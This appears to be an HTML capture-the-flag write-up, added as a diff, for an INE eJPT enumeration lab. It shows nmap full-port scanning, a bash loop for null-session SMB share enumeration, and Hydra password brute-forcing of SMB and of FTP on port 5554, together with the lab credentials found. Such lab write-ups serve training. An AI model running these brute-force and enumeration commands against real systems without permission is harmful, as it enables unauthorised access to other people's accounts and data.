+      <div class="sb-flag-row"><span class="sb-flag-dot"></span><span class="sb-flag-num">01</span>Anonymous SMB share</div>
+      <div class="sb-flag-row"><span class="sb-flag-dot"></span><span class="sb-flag-num">02</span>josh's private share</div>
+      <div class="sb-flag-row"><span class="sb-flag-dot"></span><span class="sb-flag-num">03</span>FTP on port 5554</div>
+      <div class="sb-flag-row"><span class="sb-flag-dot"></span><span class="sb-flag-num">04</span>SSH login banner</div>
+    </div>
+
+    <nav class="sb-nav">
+      <div class="sb-nav-label">Writeup</div>
+      <a class="nav-link active" href="#overview">
+        <span class="nav-ic">◈</span> Overview
+      </a>
+      <div class="sb-nav-label">Phases</div>
+      <a class="nav-link" href="#recon">
+        <span class="nav-ic">01</span> Reconnaissance
+      </a>
+      <a class="nav-link" href="#smb-enum">
+        <span class="nav-ic">02</span> SMB Enumeration
+      </a>
+      <a class="nav-link" href="#flag1">
+        <span class="nav-ic">⚑</span> Flag 1 — Anon SMB
+      </a>
+      <a class="nav-link" href="#flag2">
+        <span class="nav-ic">⚑</span> Flag 2 — josh
+      </a>
+      <a class="nav-link" href="#flag3">
+        <span class="nav-ic">⚑</span> Flag 3 — FTP :5554
+      </a>
+      <a class="nav-link" href="#flag4">
+        <span class="nav-ic">⚑</span> Flag 4 — SSH Banner
+      </a>
+      <a class="nav-link" href="#summary">
+        <span class="nav-ic">∑</span> Summary
+      </a>
+    </nav>
+  </aside>
+
+  <!-- ================================================
+       MAIN
+       ================================================ -->
+  <main class="main">
+
+    <!-- HERO -->
+    <section class="hero" id="overview">
+      <div class="hero-eyebrow">eJPT — Assessment Methodologies Lab <span>// CTF 1</span></div>
+      <div class="hero-title">
+        Enumeration<span class="cursor"></span>
+        <div class="hero-title-sub">CTF 1</div>
+      </div>
+      <div class="hero-sub"># SMB Enum · SMB Brute-Force · FTP Non-Standard Port · SSH Banner Inspection</div>
+
+      <div class="hero-meta">
+        <div class="meta-item">
+          <span class="meta-label">Platform</span>
+          <span class="meta-val mv-cyan">INE / eJPT</span>
+        </div>
+        <div class="meta-item">
+          <span class="meta-label">Target</span>
+          <span class="meta-val mv-muted">target.ine.local</span>
+        </div>
+        <div class="meta-item">
+          <span class="meta-label">IP Address</span>
+          <span class="meta-val mv-muted">192.184.161.3</span>
+        </div>
+        <div class="meta-item">
+          <span class="meta-label">OS</span>
+          <span class="meta-val mv-cyan">Linux</span>
+        </div>
+        <div class="meta-item">
+          <span class="meta-label">Flags</span>
+          <span class="meta-val mv-green">4 / 4 Captured</span>
+        </div>
+      </div>
+
+      <p class="hero-desc">
+        This lab focuses on <strong>active enumeration methodology</strong> against a single Linux target.
+        The exercise covers the complete service-interrogation workflow: null-session SMB share enumeration
+        with wordlist iteration, <strong>SMB credential brute-forcing</strong> to access a protected
+        user share, <strong>FTP credential brute-forcing on a non-standard port</strong> identified only
+        through a full <code>-p-</code> TCP scan, and SSH <strong>login banner inspection</strong> to
+        retrieve a flag without requiring a shell. Four flags are captured across four discrete attack
+        paths — each exploiting a distinct misconfiguration.
+      </p>
+    </section>
+
+    <!-- ATTACK PATH STRIP -->
+    <div class="attack-strip">
+      <span class="a-step scan">Full -p- TCP Scan</span>
+      <span class="a-arrow">→</span>
+      <span class="a-step smb">SMB Null Session</span>
+      <span class="a-arrow">→</span>
+      <span class="a-step win">Flag 1</span>
+      <span class="a-arrow">→</span>
+      <span class="a-step smb">SMB Brute-Force (josh)</span>
+      <span class="a-arrow">→</span>
+      <span class="a-step win">Flag 2</span>
+      <span class="a-arrow">→</span>
+      <span class="a-step ftp">Hydra FTP :5554 (alice)</span>
+      <span class="a-arrow">→</span>
+      <span class="a-step win">Flag 3</span>
+      <span class="a-arrow">→</span>
+      <span class="a-step cred">SSH Login Banner</span>
+      <span class="a-arrow">→</span>
+      <span class="a-step win">Flag 4</span>
+    </div>
+
+    <div class="content">
+
+      <!-- ==============================================
+           01 — RECONNAISSANCE
+           ============================================== -->
+      <section class="section" id="recon">
+        <div class="section-hd">
+          <span class="section-num">01</span>
+          <div>
+            <div class="section-title">Reconnaissance
+              <small>Full TCP Port Scan → Service Fingerprinting</small>
+            </div>
+          </div>
+        </div>
+
+        <p>
+          The first step is a full SYN scan across <em>all</em> 65,535 TCP ports. A default
+          Nmap scan covers only the top 1,000 most common ports — running a restricted scan
+          here would have missed the FTP service on port 5554 entirely, eliminating Flag 3
+          from the attack surface before enumeration even began.
+        </p>
+
+        <div class="callout c-danger">
+          <div class="callout-hd"><span class="c-label">⚠ Methodology Note</span></div>
+          <div class="c-title">Always Run a Full -p- Scan First</div>
+          <div class="c-body">
+            Default Nmap scans silently omit anything outside the top 1,000 ports. Non-standard
+            port placement is a common low-effort attempt at security through obscurity. The
+            additional time cost of <code>-p-</code> is trivial compared to the risk of missing
+            an entire service. Run it first, then focus version and script scans on the confirmed
+            open ports only.
+          </div>
+        </div>
+
+        <div class="term">
+          <div class="term-hd">
+            <div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div>
+            <span class="term-title">Phase 1 — Full SYN Scan</span>
+            <button class="copy-btn" data-t="nmap1">copy</button>
+          </div>
+          <div class="term-body"><div id="nmap1">
+<div class="ln"><span class="p1">$ </span><span class="c">nmap -sS -p- -T4 target.ine.local</span></div>
+          </div></div>
+        </div>
+
+        <div class="poc">
+          <div class="poc-hd"><span class="poc-lbl">POC <span>01</span> — Nmap Full Port Scan</span></div>
+          <img src="https://raw.githubusercontent.com/adityasingh108/ejpt-ctf-writeups/master/Enumeration/image-4.png"
+               alt="Nmap full -p- scan result showing all open ports"
+               loading="lazy" onclick="openLightbox(this.src)">
+          <div class="poc-cap">Full SYN scan identifies all open ports including FTP on the non-standard port 5554.</div>
+        </div>
+
+        <p>
+          With open ports confirmed, a version and script scan is focused against those specific ports
+          to fingerprint service versions and pull useful NSE script output:
+        </p>
+
+        <div class="term">
+          <div class="term-hd">
+            <div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div>
+            <span class="term-title">Phase 2 — Service Version &amp; Script Scan</span>
+            <button class="copy-btn" data-t="nmap2">copy</button>
+          </div>
+          <div class="term-body"><div id="nmap2">
+<div class="ln"><span class="p1">$ </span><span class="c">nmap -sV -sC -p 22,139,445,5554 target.ine.local</span></div>
+<span class="bl"></span>
+<div class="ln"><span class="o">PORT     STATE SERVICE     VERSION</span></div>
+<div class="ln"><span class="oc">22/tcp  </span><span class="o"> open  ssh         OpenSSH</span></div>
+<div class="ln"><span class="oc">139/tcp </span><span class="o"> open  netbios-ssn Samba smbd</span></div>
+<div class="ln"><span class="oc">445/tcp </span><span class="o"> open  netbios-ssn Samba smbd</span></div>
+<div class="ln"><span class="oc">5554/tcp</span><span class="oh"> open  ftp         vsftpd (non-standard port)</span></div>
+          </div></div>
+        </div>
+
+        <table class="port-tbl">
+          <thead>
+            <tr>
+              <th>Port</th>
+              <th>Proto</th>
+              <th>Service</th>
+              <th>Notes</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td class="pn">22</td>
+              <td class="o">tcp</td>
+              <td class="ps">SSH</td>
+              <td class="pnote">Banner / MOTD inspection — Flag 4</td>
+            </tr>
+            <tr>
+              <td class="pn">139 / 445</td>
+              <td class="o">tcp</td>
+              <td class="ps">SMB / Samba</td>
+              <td class="pnote">Null session enum — Flag 1 &amp; 2</td>
+            </tr>
+            <tr>
+              <td class="pn">5554</td>
+              <td class="o">tcp</td>
+              <td class="ps">FTP (non-standard)</td>
+              <td class="pnote">Invisible to default Nmap — Flag 3. Only found via -p-</td>
+            </tr>
+          </tbody>
+        </table>
+
+      </section>
+
+      <!-- ==============================================
+           02 — SMB ENUMERATION
+           ============================================== -->
+      <section class="section" id="smb-enum">
+        <div class="section-hd">
+          <span class="section-num smb">02</span>
+          <div>
+            <div class="section-title">SMB Enumeration
+              <small>Null Session Share Listing → Wordlist Iteration</small>
+            </div>
+          </div>
+        </div>
+
+        <p>
+          With Samba confirmed on 139/445, the correct opening move is a null-session share
+          listing — no credentials required. This frequently returns the full list of shares,
+          user policy information, and in misconfigured environments, directory contents directly.
+        </p>
+
+        <div class="term">
+          <div class="term-hd">
+            <div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div>
+            <span class="term-title">smbclient — Null Session Share Listing</span>
+            <button class="copy-btn" data-t="smb1">copy</button>
+          </div>
+          <div class="term-body"><div id="smb1">
+<div class="ln"><span class="p1">$ </span><span class="c">smbclient -L //target.ine.local -N</span></div>
+          </div></div>
+        </div>
+
+        <h3 class="smb">Automated Share Iteration via Wordlist</h3>
+
+        <p>
+          Rather than checking shares manually one at a time, a Bash loop iterates the full
+          share wordlist, attempting a null-session directory listing against each potential
+          share name. Shares that permit anonymous access return file listings; those that
+          don't return an access denied error. This approach is faster, more thorough, and
+          requires no guessing.
+        </p>
+
+        <div class="wl-box">
+          <div class="wl-lbl">Wordlist Path</div>
+          /root/Desktop/wordlists/shares.txt
+        </div>
+
+        <div class="term">
+          <div class="term-hd">
+            <div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div>
+            <span class="term-title">Bash Loop — SMB Share Enumeration</span>
+            <button class="copy-btn" data-t="smb2">copy</button>
+          </div>
+          <div class="term-body"><div id="smb2">
+<div class="ln"><span class="p1">$ </span><span class="c">while read share; do</span></div>
+<div class="ln"><span class="p1">&gt; </span><span class="c">  echo "shareName = $share"</span></div>
+<div class="ln"><span class="p1">&gt; </span><span class="c">  smbclient \\\\target.ine.local\\$share -N -c 'ls'</span></div>
+<div class="ln"><span class="p1">&gt; </span><span class="c">done &lt; /root/Desktop/wordlists/shares.txt</span></div>
+<span class="bl"></span>
+<div class="ln"><span class="cm"># Output — anonymous shares return file listings</span></div>
+<div class="ln"><span class="cm"># Access-denied shares are immediately apparent from error output</span></div>
+          </div></div>
+        </div>
+
+        <div class="callout c-info">
+          <div class="callout-hd"><span class="c-label">⚑ Technique Note</span></div>
+          <div class="c-title">Why Loop Rather Than Check Manually</div>
+          <div class="c-body">
+            Manual share checking requires a separate command per share and relies on the analyst to
+            interpret which names are worth trying. The wordlist loop removes both bottlenecks — it
+            is exhaustive, systematic, and produces a clear binary result (listing vs. access denied)
+            for every candidate share name in seconds. This is the correct default approach against
+            any SMB target.
+          </div>
+        </div>
+
+      </section>
+
+      <!-- ==============================================
+           FLAG 1 — ANONYMOUS SMB
+           ============================================== -->
+      <section class="section" id="flag1">
+        <div class="section-hd">
+          <span class="section-num flag">⚑ 01</span>
+          <div>
+            <div class="section-title">Flag 1 — Anonymous SMB Share Access
+              <small>Null-session smbclient → file retrieval</small>
+            </div>
+          </div>
+        </div>
+
+        <p>
+          The wordlist iteration reveals a share that accepts anonymous (null-session) connections
+          and exposes its contents without any credential prompt. Connecting directly and retrieving
+          <code>flag1.txt</code> requires no password.
+        </p>
+
+        <div class="term">
+          <div class="term-hd">
+            <div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div>
+            <span class="term-title">Anonymous SMB Access — Flag 1 Retrieval</span>
+            <button class="copy-btn" data-t="f1">copy</button>
+          </div>
+          <div class="term-body"><div id="f1">
+<div class="ln"><span class="p1">$ </span><span class="c">smbclient \\\\target.ine.local\\&lt;share_name&gt; -N</span></div>
+<div class="ln"><span class="og">Try "help" to get a list of possible commands.</span></div>
+<span class="bl"></span>
+<div class="ln"><span class="ps">smb: \&gt; </span><span class="c">dir</span></div>
+<div class="ln"><span class="o">  .                                   D        0</span></div>
+<div class="ln"><span class="o">  ..                                  D        0</span></div>
+<div class="ln"><span class="oh">  flag1.txt                           N       32</span></div>
+<span class="bl"></span>
+<div class="ln"><span class="ps">smb: \&gt; </span><span class="c">get flag1.txt</span></div>
+<div class="ln"><span class="og">getting file \flag1.txt of size 32</span></div>
+<span class="bl"></span>
+<div class="ln"><span class="ps">smb: \&gt; </span><span class="c">exit</span></div>
+<span class="bl"></span>
+<div class="ln"><span class="p1">$ </span><span class="c">cat flag1.txt</span></div>
+          </div></div>
+        </div>
+
+        <div class="poc">
+          <div class="poc-hd"><span class="poc-lbl">POC <span>02</span> — Flag 1 Captured</span></div>
+          <img src="https://raw.githubusercontent.com/adityasingh108/ejpt-ctf-writeups/master/Enumeration/image-2.png"
+               alt="Flag 1 retrieved from anonymous SMB share"
+               loading="lazy" onclick="openLightbox(this.src)">
+          <div class="poc-cap">Anonymous smbclient session listing flag1.txt and printing its contents.</div>
+        </div>
+
+        <div class="flag-box">
+          <div class="flag-box-hd">
+            <span class="flag-lbl">Flag 1</span>
+            <span class="flag-loc">Anonymous SMB Share → flag1.txt</span>
+          </div>
+          <div class="flag-method">Method: Null-session smbclient — no credentials required</div>
+        </div>
+
+        <div class="callout c-vuln">
+          <div class="callout-hd">
+            <span class="c-label">⚠ Misconfiguration</span>
+            <span class="c-tag">CWE-284 · Improper Access Control</span>
+          </div>
+          <div class="c-title">Anonymous SMB Share Access</div>
+          <div class="c-body">
+            Null-session access means any unauthenticated client on the network can list and
+            read files in the share. No credentials are required — the share is effectively
+            public. In a real engagement this is a critical finding: all files in the share
+            are exposed to any host on the network segment, including sensitive documents,
+            configuration files, or credentials.
+          </div>
+        </div>
+
+      </section>
+
+      <!-- ==============================================
+           FLAG 2 — JOSH'S PRIVATE SHARE
+           ============================================== -->
+      <section class="section" id="flag2">
+        <div class="section-hd">
+          <span class="section-num flag">⚑ 02</span>
+          <div>
+            <div class="section-title">Flag 2 — Weak Password on Private SMB Share
+              <small>SMB Credential Brute-Force → Authenticated Access (josh)</small>
+            </div>
+          </div>
+        </div>
+
+        <p>
+          The second flag is behind a user's private share protected by a password. The lab
+          hint confirms a user named <code>josh</code> has a weak password. Private shares
+          in SMB environments are frequently named after their owning user — knowing the
+          username makes the share name trivially predictable. The attack reduces to a
+          single credential brute-force.
+        </p>
+
+        <div class="term">
+          <div class="term-hd">
+            <div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div>
+            <span class="term-title">SMB Credential Brute-Force — josh</span>
+            <button class="copy-btn" data-t="f2bf">copy</button>
+          </div>
+          <div class="term-body"><div id="f2bf">
+<div class="ln"><span class="p1">$ </span><span class="c">cat /root/Desktop/wordlists/shares.txt</span></div>
+<div class="ln"><span class="cm"># wordlist confirms share name: josh</span></div>
+<span class="bl"></span>
+<div class="ln"><span class="cm"># Brute-force josh's SMB credentials</span></div>
+<div class="ln"><span class="p1">$ </span><span class="c">hydra -l josh \</span></div>
+<div class="ln"><span class="o">  -P /root/Desktop/wordlists/unix_passwords.txt \</span></div>
+<div class="ln"><span class="o">  smb://target.ine.local \</span></div>
+<div class="ln"><span class="o">  -V</span></div>
+<span class="bl"></span>
+<div class="ln"><span class="og">[445][smb] host: target.ine.local   login: josh   password: &lt;password&gt;</span></div>
+          </div></div>
+        </div>
+
+        <h3 class="smb">Authenticated SMB Access — Retrieve Flag 2</h3>
+
+        <p>
+          With <code>josh</code>'s password recovered, connect to the private share directly using
+          authenticated credentials and retrieve the flag:
+        </p>
+
+        <div class="term">
+          <div class="term-hd">
+            <div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div>
+            <span class="term-title">Authenticated SMB Session — Flag 2 Retrieval</span>
+            <button class="copy-btn" data-t="f2">copy</button>
+          </div>
+          <div class="term-body"><div id="f2">
+<div class="ln"><span class="p1">$ </span><span class="c">smbclient \\\\target.ine.local\\josh -U josh</span></div>
+<div class="ln"><span class="o">Password for [WORKGROUP\josh]: </span><span class="oh">***</span></div>
+<div class="ln"><span class="og">Try "help" to get a list of possible commands.</span></div>
+<span class="bl"></span>
+<div class="ln"><span class="ps">smb: \&gt; </span><span class="c">dir</span></div>
+<div class="ln"><span class="o">  .                                   D        0</span></div>
+<div class="ln"><span class="o">  ..                                  D        0</span></div>
+<div class="ln"><span class="oh">  flag2.txt                           N       32</span></div>
+<span class="bl"></span>
+<div class="ln"><span class="ps">smb: \&gt; </span><span class="c">get flag2.txt</span></div>
+<div class="ln"><span class="og">getting file \flag2.txt of size 32</span></div>
+<span class="bl"></span>
+<div class="ln"><span class="ps">smb: \&gt; </span><span class="c">exit</span></div>
+<span class="bl"></span>
+<div class="ln"><span class="p1">$ </span><span class="c">cat flag2.txt</span></div>
+          </div></div>
+        </div>
+
+        <div class="poc">
+          <div class="poc-hd"><span class="poc-lbl">POC <span>03</span> — Flag 2 Captured</span></div>
+          <img src="https://raw.githubusercontent.com/adityasingh108/ejpt-ctf-writeups/master/Enumeration/image-5.png"
+               alt="Flag 2 retrieved from josh's authenticated SMB share"
+               loading="lazy" onclick="openLightbox(this.src)">
+          <div class="poc-cap">Authenticated smbclient session as josh, retrieving flag2.txt from the private share.</div>
+        </div>
+
+        <div class="flag-box">
+          <div class="flag-box-hd">
+            <span class="flag-lbl">Flag 2</span>
+            <span class="flag-loc">josh's SMB Share → flag2.txt</span>
+          </div>
+          <div class="flag-method">Method: SMB credential brute-force → authenticated smbclient access</div>
+        </div>
+
+        <div class="callout c-vuln">
+          <div class="callout-hd">
+            <span class="c-label">⚠ Misconfiguration</span>
+            <span class="c-tag">Weak Credentials</span>
+          </div>
+          <div class="c-title">User Share Named After Account + Weak Password</div>
+          <div class="c-body">
+            Predictable share naming (share = username) means that once a valid username is
+            known — from LDAP, RPC, or prior enumeration — the target share name requires
+            zero additional guessing. Weak passwords on personal shares are a common finding
+            in SMB environments. Always brute-force user accounts on Samba after confirming
+            null-session access fails — the two attack paths are complementary, not exclusive.
+          </div>
+        </div>
+
+      </section>
+
+      <!-- ==============================================
+           FLAG 3 — FTP NON-STANDARD PORT
+           ============================================== -->
+      <section class="section" id="flag3">
+        <div class="section-hd">
+          <span class="section-num ftp">⚑ 03</span>
+          <div>
+            <div class="section-title">Flag 3 — FTP Brute-Force on Non-Standard Port
+              <small>Hydra -s 5554 → alice → FTP login</small>
+            </div>
+          </div>
+        </div>
+
+        <p>
+          The full <code>-p-</code> scan identified FTP running on port <strong style="color:var(--amber)">5554</strong>
+          rather than the standard port 21. A default Nmap scan would have missed this entirely.
+          The lab hint names the user as <code>alice</code>. Hydra's <code>-s</code> flag
+          redirects the brute-force to the non-standard port — moving a service to an obscure
+          port provides zero additional security once the port is identified.
+        </p>
+
+        <div class="term">
+          <div class="term-hd">
+            <div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div>
+            <span class="term-title">Hydra — FTP Brute-Force on Port 5554</span>
+            <button class="copy-btn" data-t="f3h">copy</button>
+          </div>
+          <div class="term-body"><div id="f3h">
+<div class="ln"><span class="p1">$ </span><span class="c">hydra -l alice \</span></div>
+<div class="ln"><span class="o">  -P /root/Desktop/wordlists/unix_passwords.txt \</span></div>
+<div class="ln"><span class="o">  ftp://target.ine.local \</span></div>
+<div class="ln"><span class="o">  -s 5554 \</span></div>
+<div class="ln"><span class="o">  -t 16 \</span></div>
+<div class="ln"><span class="o">  -V</span></div>
+<span class="bl"></span>
+<div class="ln"><span class="og">[5554][ftp] host: target.ine.local   login: alice   password: pretty</span></div>
+          </div></div>
+        </div>
+
+        <div class="hi-block">
+<div class="ln"><span class="oc">-l alice  </span><span class="oh">→  </span><span class="o">Single username target</span></div>
+<div class="ln"><span class="oc">-P &lt;list&gt; </span><span class="oh">→  </span><span class="o">Iterate unix_passwords.txt wordlist against the account</span></div>
+<div class="ln"><span class="oc">-s 5554   </span><span class="oh">→  </span><span class="o">Override default port — attack the non-standard FTP port directly</span></div>
+<div class="ln"><span class="oc">-t 16     </span><span class="oh">→  </span><span class="o">16 parallel threads — faster throughput without triggering rate limits</span></div>
+<div class="ln"><span class="oc">-V        </span><span class="oh">→  </span><span class="o">Verbose — print each attempt for visibility</span></div>
+        </div>
+
+        <div class="cred-box">
+          <div class="cred-item">
+            <span class="cred-lbl">Username</span>
+            <span class="cred-val cv-name">alice</span>
+          </div>
+          <div class="cred-item">
+            <span class="cred-lbl">Password</span>
+            <span class="cred-val cv-pass">pretty</span>
+          </div>
+          <div class="cred-item">
+            <span class="cred-lbl">Service</span>
+            <span class="cred-val cv-svc">FTP</span>
+          </div>
+          <div class="cred-item">
+            <span class="cred-lbl">Port</span>
+            <span class="cred-val cv-port">5554 (non-standard)</span>
+          </div>
+        </div>
+
+        <h3 class="ftp">FTP Login → Flag 3 Retrieval</h3>
+
+        <div class="term">
+          <div class="term-hd">
+            <div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div>
+            <span class="term-title">FTP Login on Port 5554 — Flag 3</span>
+            <button class="copy-btn" data-t="f3">copy</button>
+          </div>
+          <div class="term-body"><div id="f3">
+<div class="ln"><span class="p1">$ </span><span class="c">ftp -p target.ine.local 5554</span></div>
+<div class="ln"><span class="o">Connected to target.ine.local.</span></div>
+<div class="ln"><span class="o">220 (vsftpd)</span></div>
+<div class="ln"><span class="o">Name (target.ine.local:root): </span><span class="og">alice</span></div>
+<div class="ln"><span class="o">Password: </span><span class="oh">pretty</span></div>
+<div class="ln"><span class="og">230 Login successful.</span></div>
+<span class="bl"></span>
+<div class="ln"><span class="ps">ftp&gt; </span><span class="c">ls</span></div>
+<div class="ln"><span class="oh">flag3.txt</span></div>
+<span class="bl"></span>
+<div class="ln"><span class="ps">ftp&gt; </span><span class="c">get flag3.txt</span></div>
+<div class="ln"><span class="og">226 Transfer complete.</span></div>
+<span class="bl"></span>
+<div class="ln"><span class="ps">ftp&gt; </span><span class="c">bye</span></div>
+<span class="bl"></span>
+<div class="ln"><span class="p1">$ </span><span class="c">cat flag3.txt</span></div>
+          </div></div>
+        </div>
+
+        <div class="poc">
+          <div class="poc-hd"><span class="poc-lbl">POC <span>04</span> — Flag 3 Captured</span></div>
+          <img src="https://raw.githubusercontent.com/adityasingh108/ejpt-ctf-writeups/master/Enumeration/image-3.png"
+               alt="FTP login to port 5554 as alice and flag3 retrieval"
+               loading="lazy" onclick="openLightbox(this.src)">
+          <div class="poc-cap">Hydra brute-force result and FTP session as alice on non-standard port 5554.</div>
+        </div>
+
+        <div class="flag-box">
+          <div class="flag-box-hd">
+            <span class="flag-lbl">Flag 3</span>
+            <span class="flag-loc">FTP :5554 (alice) → flag3.txt</span>
+          </div>
+          <div class="flag-method">Method: Full -p- scan → Hydra -s 5554 → authenticated FTP</div>
+        </div>
+
+        <div class="callout c-danger">
+          <div class="callout-hd">
+            <span class="c-label">⚠ Misconfiguration</span>
+          </div>
+          <div class="c-title">Non-Standard Port + Weak FTP Credentials</div>
+          <div class="c-body">
+            Port obfuscation is not a security control — it is defeated by a single Nmap
+            <code>-p-</code> flag. Once the port is identified, Hydra's <code>-s</code>
+            option trivially redirects the attack. FTP transmits credentials in cleartext
+            on top of this. In a real environment, FTP on any port should be replaced with
+            SFTP, and accounts must have strong, unique passwords not present in any wordlist.
+          </div>
+        </div>
+
+      </section>
+
+      <!-- ==============================================
+           FLAG 4 — SSH LOGIN BANNER
+           ============================================== -->
+      <section class="section" id="flag4">
+        <div class="section-hd">
+          <span class="section-num ssh">⚑ 04</span>
+          <div>
+            <div class="section-title">Flag 4 — SSH Login Banner (MOTD)
+              <small>ssh admin@target → Banner / MOTD Inspection</small>
+            </div>
+          </div>
+        </div>
+
+        <p>
+          The fourth flag's hint describes "a warning meant to deter unauthorised users from
+          logging in" — the textbook description of an SSH pre-login banner or post-authentication
+          MOTD. These are defined in <code>/etc/issue.net</code> and <code>/etc/motd</code>
+          respectively, and are displayed automatically to every connecting client. No filesystem
+          navigation or privilege escalation is required — the flag surfaces on login.
+        </p>
+
+        <div class="term">
+          <div class="term-hd">
+            <div class="dots"><div class="dot dr"></div><div class="dot dy"></div><div class="dot dg"></div></div>
+            <span class="term-title">SSH Login — Banner Inspection</span>
+            <button class="copy-btn" data-t="f4">copy</button>
+          </div>
+          <div class="term-body"><div id="f4">
+<div class="ln"><span class="p1">$ </span><span class="c">ssh admin@target.ine.local</span></div>
+<span class="bl"></span>
+<div class="ln"><span class="cm"># Flag appears automatically in the login banner / MOTD</span></div>
+<div class="ln"><span class="cm"># before or immediately after authentication completes</span></div>
+<span class="bl"></span>
+<div class="ln"><span class="oh">##############################################</span></div>
+<div class="ln"><span class="oh">#  WARNING: Authorised Access Only          #</span></div>
+<div class="ln"><span class="oh">#  FLAG: &lt;flag4_value&gt;                      #</span></div>
+<div class="ln"><span class="oh">##############################################</span></div>
+          </div></div>
+        </div>
+
+        <div class="poc">
+          <div class="poc-hd"><span class="poc-lbl">POC <span>05</span> — Flag 4 Captured</span></div>
+          <img src="https://raw.githubusercontent.com/adityasingh108/ejpt-ctf-writeups/master/Enumeration/image-1.png"
+               alt="Flag 4 visible in SSH login banner / MOTD"
+               loading="lazy" onclick="openLightbox(this.src)">
+          <div class="poc-cap">SSH login banner displaying the flag immediately on authentication — no shell commands needed.</div>
+        </div>
+
+        <div class="flag-box">
+          <div class="flag-box-hd">
+            <span class="flag-lbl">Flag 4</span>
+            <span class="flag-loc">SSH login banner / MOTD → admin@target.ine.local</span>
+          </div>
+          <div class="flag-method">Method: SSH login → MOTD / banner displayed automatically on connect</div>
+        </div>
+
+        <div class="callout c-note">
+          <div class="callout-hd"><span class="c-label">⚑ Technique Note</span></div>
+          <div class="c-title">SSH Banners Are Always Worth Reading</div>
+          <div class="c-body">
+            <code>/etc/motd</code> and <code>/etc/issue.net</code> display to every authenticated
+            SSH session automatically. In real environments these files frequently contain internal
+            system information, configuration hints, or — as shown here — sensitive strings
+            inadvertently left by administrators. Always read the full banner before issuing any
+            commands. No further enumeration of the filesystem was required for this flag.
+          </div>
+        </div>
+
+      </section>
+
+      <!-- ==============================================
+           SUMMARY
+           ============================================== -->
+      <section class="section" id="summary">
+        <div class="section-hd">
+          <span class="section-num">∑</span>
+          <div>
+            <div class="section-title">Flags Summary &amp; Key Takeaways</div>
+          </div>
+        </div>
+
+        <table class="flags-tbl">
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Location</th>
+              <th>Method</th>
+              <th>Credential(s)</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td class="ft-num">01</td>
+              <td class="ft-loc">Anonymous SMB share → flag1.txt</td>
+              <td class="ft-meth">Null-session smbclient</td>
+              <td class="ft-val">None — anonymous</td>
+            </tr>
+            <tr>
+              <td class="ft-num">02</td>
+              <td class="ft-loc">josh's private share → flag2.txt</td>
+              <td class="ft-meth">SMB brute-force → auth smbclient</td>
+              <td class="ft-val">josh / (brute-forced)</td>
+            </tr>
+            <tr>
+              <td class="ft-num">03</td>
+              <td class="ft-loc">FTP :5554 → flag3.txt</td>
+              <td class="ft-meth">-p- scan → Hydra -s 5554</td>
+              <td class="ft-val">alice / pretty</td>
+            </tr>
+            <tr>
+              <td class="ft-num">04</td>
+              <td class="ft-loc">SSH login banner (MOTD)</td>
+              <td class="ft-meth">SSH login → banner auto-displayed</td>
+              <td class="ft-val">admin / (given)</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <div class="divider"></div>
+
+        <div class="callout c-win">
+          <div class="callout-hd"><span class="c-label">★ Key Takeaways</span></div>
+          <div class="c-title">Lessons from Enumeration CTF 1</div>
+          <div class="c-body">
+            <strong style="color:var(--green)">1. Always run -p-.</strong> FTP on port 5554 was completely
+            invisible to a default scan. A full port scan is non-negotiable for any assessment —
+            the time cost is always worth it.<br><br>
+            <strong style="color:var(--green)">2. Null-session SMB is the correct first step.</strong>
+            It costs nothing and frequently reveals shares, usernames, and files outright
+            before a single credential is needed.<br><br>
+            <strong style="color:var(--green)">3. Automate share iteration.</strong> A Bash loop
+            over a wordlist is faster, more thorough, and more systematic than any manual
+            approach. Build this reflex into SMB enumeration.<br><br>
+            <strong style="color:var(--green)">4. Port obscurity is not security.</strong>
+            Hydra's <code>-s</code> flag attacks any port. Once identified, an FTP service
+            on port 5554 is no harder to brute-force than one on port 21.<br><br>
+            <strong style="color:var(--green)">5. Read SSH banners carefully.</strong>
+            MOTD content displays automatically and is frequently overlooked — it can contain
+            flags, credentials, or system information without requiring any further enumeration.
+          </div>
+        </div>
+
+        <h3>Skills Practiced</h3>
+        <div class="hi-block">
+<div class="ln"><span class="oc">•  </span><span class="o">Full TCP Port Scanning — Nmap -p- (all 65535 ports)</span></div>
+<div class="ln"><span class="oc">•  </span><span class="o">Service Version &amp; Banner Fingerprinting — Nmap -sV -sC</span></div>
+<div class="ln"><span class="oc">•  </span><span class="o">SMB Share Enumeration — Null Sessions, smbclient</span></div>
+<div class="ln"><span class="oc">•  </span><span class="o">Automated Share Iteration — Bash loop + wordlist</span></div>
+<div class="ln"><span class="oc">•  </span><span class="o">SMB Credential Brute-Force — Hydra / password wordlist</span></div>
+<div class="ln"><span class="oc">•  </span><span class="o">Authenticated SMB Access &amp; File Retrieval</span></div>
+<div class="ln"><span class="oc">•  </span><span class="o">FTP Brute-Force on Non-Standard Ports — Hydra -s &lt;port&gt;</span></div>
+<div class="ln"><span class="oc">•  </span><span class="o">SSH Login Banner &amp; MOTD Inspection</span></div>
+<div class="ln"><span class="oc">•  </span><span class="o">Credential Discovery &amp; Reuse Across Services</span></div>
+<div class="ln"><span class="oc">•  </span><span class="o">Active Enumeration Methodology</span></div>
+        </div>
+
+      </section>
+
+    </div><!-- /content -->
+
+    <!-- FOOTER -->
+    <footer class="footer">
+      <div class="footer-l">eJPT // <span>Assessment Methodologies: Enumeration CTF 1</span></div>
+      <div class="footer-r">
+        <a class="ft-link" href="https://ine.com/learning/certifications/internal/elearnsecurity-junior-penetration-tester" target="_blank" rel="noopener">eJPT Cert</a>
+        <a class="ft-link" href="https://github.com/adityasingh108/ejpt-ctf-writeups" target="_blank" rel="noopener">Writeups Repo</a>
+      </div>
+    </footer>
+
+  </main>
+</div><!-- /layout -->
+
+<!-- Lightbox -->
